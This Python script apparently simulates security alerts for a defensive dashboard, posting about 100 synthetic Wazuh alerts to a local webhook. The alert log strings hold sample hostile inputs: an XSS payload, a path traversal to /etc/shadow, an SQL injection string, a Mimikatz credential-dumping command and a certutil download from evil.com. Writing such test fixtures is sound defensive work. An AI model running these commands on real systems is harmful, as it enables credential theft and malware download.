"""
BlueGuard Universal Threat Simulator
Generates 100+ highly diverse Wazuh alerts spanning EVERY major category:
Web, Cloud, Endpoint, Network, Malware, Insider Threat, and Identity.
"""
import requests
import time
import random
import datetime

WEBHOOK_URL = "http://127.0.0.1:5000/webhook"
DELAY_BETWEEN_ALERTS = 4 # Seconds to wait to prevent API rate limits

AGENTS = [
    {"id": "001", "name": "PROD-DB-CLUSTER", "ip": "10.0.1.10"},
    {"id": "002", "name": "DMZ-WEB-SERVER", "ip": "10.0.1.20"},
    {"id": "003", "name": "K8S-WORKER-01", "ip": "10.0.2.15"},
    {"id": "004", "name": "DC-PRIMARY", "ip": "10.0.1.30"},
    {"id": "005", "name": "WKS-DEV-04", "ip": "10.0.5.55"},
    {"id": "006", "name": "AWS-JUMP-HOST", "ip": "10.0.4.10"},
]

SCENARIOS = [
    # --- WEB ATTACKS ---
    {
        "level": 12, "groups": ["web", "xss"], "cve": "CWE-79",
        "desc": "Cross-Site Scripting (XSS) payload detected in HTTP request.",
        "log": 'nginx: 192.168.1.5 - - "GET /search?q=<script>alert(1)</script> HTTP/1.1" 403'
    },
    {
        "level": 14, "groups": ["web", "path_traversal"], "cve": "CWE-22",
        "desc": "Path Traversal attempt (LFI) detected.",
        "log": 'apache: 192.168.1.8 - - "GET /download.php?file=../../../../etc/shadow HTTP/1.1" 200'
    },
    {
        "level": 10, "groups": ["web", "sqli"], "cve": "CWE-89",
        "desc": "SQL Injection attempt detected on login portal.",
        "log": 'error: SQL syntax error near "admin\' OR \'1\'=\'1" in query'
    },

    # --- ENDPOINT & MALWARE ---
    {
        "level": 15, "groups": ["sysmon", "mimikatz"], "cve": "N/A",
        "desc": "Mimikatz execution detected (Credential Dumping).",
        "log": "EventID 1: Process sekurlsa::logonpasswords executed by sekurlsa.dll"
    },
    {
        "level": 14, "groups": ["sysmon", "cobalt_strike"], "cve": "N/A",
        "desc": "Suspicious Named Pipe created (Cobalt Strike indicator).",
        "log": "EventID 17: Pipe Created. PipeName: \\msfds"
    },
    {
        "level": 12, "groups": ["windows", "lolbins"], "cve": "N/A",
        "desc": "Certutil used to download file from external IP.",
        "log": "EventID 1: Process Creation. certutil.exe -urlcache -split -f http://evil.com/payload.exe"
    },

    # --- CLOUD & CONTAINERS ---
    {
        "level": 13, "groups": ["docker", "escape"], "cve": "N/A",
        "desc": "Docker container escape attempt (mount / host filesystem).",
        "log": "auditd: type=SYSCALL exe=\"/bin/mount\" arg1=\"/dev/sda1\" arg2=\"/mnt/host\""
    },
    {
        "level": 11, "groups": ["aws", "iam"], "cve": "N/A",
        "desc": "AWS CloudTrail: Unauthorized IAM user creation attempt.",
        "log": "CloudTrail: CreateUser action denied for User: arn:aws:iam::12345:user/devops."
    },

    # --- NETWORK & PROTOCOL ---
    {
        "level": 8, "groups": ["network", "port_scan"], "cve": "N/A",
        "desc": "Nmap port scan detected from internal IP.",
        "log": "snort: [1:1000001:1] NMAP SYN SCAN detected -> 10.0.1.20:22"
    },
    {
        "level": 13, "groups": ["network", "dns_tunnel"], "cve": "N/A",
        "desc": "Suspicious DNS tunneling behavior (large TXT records).",
        "log": "zeek: dns_query TXT very_long_base64_string_here.malicious.com"
    },

    # --- IDENTITY & AUTHENTICATION ---
    {
        "level": 12, "groups": ["windows", "pass_the_hash"], "cve": "N/A",
        "desc": "Pass-the-Hash (PtH) attack indicator detected.",
        "log": "EventID 4624: Logon Type 9 (NewCredentials). Authentication Package: NTLM."
    },
    {
        "level": 9, "groups": ["authentication", "impossible_travel"], "cve": "N/A",
        "desc": "Impossible travel detection for user 'admin'.",
        "log": "AuthDB: User 'admin' logged in from US (IP1) and RU (IP2) within 5 minutes."
    },

    # --- INSIDER THREAT ---
    {
        "level": 11, "groups": ["dlp", "exfiltration"], "cve": "N/A",
        "desc": "Mass download of confidential files to USB drive.",
        "log": "EventID 4663: Access to E:\\Finance_Records (USB) - 5,420 files copied."
    },
    {
        "level": 7, "groups": ["syslog", "off_hours"], "cve": "N/A",
        "desc": "Physical badge access during abnormal hours.",
        "log": "Badge System: Employee ID 849 accessed Server Room at 03:14 AM on Sunday."
    },

    # --- FAMOUS VULNERABILITIES ---
    {
        "level": 15, "groups": ["vulnerability", "nessus"], "cve": "CVE-2021-34527",
        "desc": "PrintNightmare vulnerability detected on Domain Controller.",
        "log": "Nessus: Windows Print Spooler RCE (CVE-2021-34527). CVSS 8.8."
    },
    {
        "level": 14, "groups": ["vulnerability", "nessus"], "cve": "CVE-2014-0160",
        "desc": "Heartbleed vulnerability detected on OpenSSL service.",
        "log": "Nessus: OpenSSL Information Disclosure (Heartbleed). CVSS 7.5."
    },
    
    # --- RANSOMWARE ---
    {
        "level": 15, "groups": ["sysmon", "ransomware"], "cve": "N/A",
        "desc": "WannaCry ransomware indicators detected (SMB exploit).",
        "log": "suricata: ET EXPLOIT Possible ETERNALBLUE MS17-010 Echo Response"
    },
    
    # --- COMPLIANCE / MISCONFIG ---
    {
        "level": 6, "groups": ["compliance", "firewall"], "cve": "N/A",
        "desc": "Windows Defender Firewall disabled by user.",
        "log": "EventID 4950: A Windows Firewall setting has changed. Profile: Domain, Enabled: No."
    }
]

def generate_alerts(count=100):
    alerts = []
    base_time = datetime.datetime.now() - datetime.timedelta(hours=5)
    
    for i in range(count):
        agent = random.choice(AGENTS)
        scenario = random.choice(SCENARIOS)
        
        # Advance time by a few minutes for each alert
        alert_time = base_time + datetime.timedelta(minutes=(i * 3))
        
        unique_id = random.randint(10000, 99999)
        full_log = scenario["log"] + f" [TraceID: {unique_id}]"
        
        alert = {
            "timestamp": alert_time.strftime("%Y-%m-%dT%H:%M:%S+05:30"),
            "rule": {
                "level": scenario["level"],
                "description": scenario["desc"],
                "id": str(random.randint(100, 9999)),
                "groups": scenario["groups"]
            },
            "agent": agent,
            "full_log": full_log
        }
        alerts.append(alert)
        
    return alerts

def main():
    print("=" * 60)
    print(" 🌍 BlueGuard Universal Threat Simulator 🌍")
    print("=" * 60)
    print(f"Generating 100 unique alerts across ALL security domains...")
    
    alerts = generate_alerts(100)
    
    print(f"Starting transmission to BlueGuard Webhook ({WEBHOOK_URL})")
    print(f"Warning: A {DELAY_BETWEEN_ALERTS}-second delay is added between alerts.")
    print("-" * 60)
    
    success = 0
    failed = 0
    
    for i, alert in enumerate(alerts):
        print(f"[{i+1}/100] Sending -> {alert['agent']['name']} | {alert['rule']['description'][:60]}...")
        
        try:
            resp = requests.post(WEBHOOK_URL, json=alert, timeout=30)
            if resp.status_code == 200:
                success += 1
            else:
                failed += 1
                print(f"   ❌ Failed: HTTP {resp.status_code}")
        except requests.exceptions.RequestException as e:
            failed += 1
            print(f"   ❌ Connection Error")
            
        if i < len(alerts) - 1:
            time.sleep(DELAY_BETWEEN_ALERTS)
            
    print("=" * 60)
    print(" Simulation Complete!")
    print(f" Successfully Sent: {success}")
    print(f" Failed/Errors: {failed}")
    print(" Check your dashboard at http://127.0.0.1:5000")
    print("=" * 60)

if __name__ == "__main__":
    main()
